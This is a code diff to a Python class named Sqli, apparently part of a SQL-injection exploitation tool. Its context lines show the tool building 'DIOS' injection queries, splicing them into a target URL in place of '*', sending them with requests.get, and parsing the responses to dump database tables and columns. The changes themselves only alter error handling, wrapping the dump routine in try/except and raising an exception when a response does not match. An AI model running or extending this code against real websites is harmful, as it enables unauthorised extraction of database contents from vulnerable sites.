@@ -18,10 +18,10 @@ class Sqli:
         if ( sqli_helper ):
             return sqli_helper.group(1)
         else:
-            return {
+            raise Exception({
                     "status": False,
                     "message": "Response sql injectin do not match"
-                }
+                })
     def getResultByTag(self, tag):
         sqli_helper = re.search(f"<{tag}>(.*)</{tag}>",self.result)
         return sqli_helper.group(1) if bool(sqli_helper) else "Can't get information"
@@ -91,20 +91,23 @@ class Sqli:
             query           = Dios().dump_data(tables, columns, database)
             query_builder   = Dios().build(query)
             response        = requests.get(self.url.replace('*',query_builder))
-            result          = self.get_result(response.text)
-            sqli_array      = result.split('<end/>,')
+            try:
+                result          = self.get_result(response.text)
+                sqli_array      = result.split('<end/>,')
 
-            realResult              = dict()
-            realResult['columns']   = columns
-            realResult['data']      = list()
-            for sqli in sqli_array:
-                self.result = sqli
-                result      = dict()
+                realResult              = dict()
+                realResult['columns']   = columns
+                realResult['data']      = list()
+                for sqli in sqli_array:
+                    self.result = sqli
+                    result      = dict()
 
-                for column in columns:
-                    result[column] = self.getResultByTag(column)
-                realResult['data'].append(result)
-            return realResult
+                    for column in columns:
+                        result[column] = self.getResultByTag(column)
+                    realResult['data'].append(result)
+                return realResult
+            except Exception as identifier:
+                return identifier
 
     def command_line(self):
         user   = Dios().build(Dios().user())
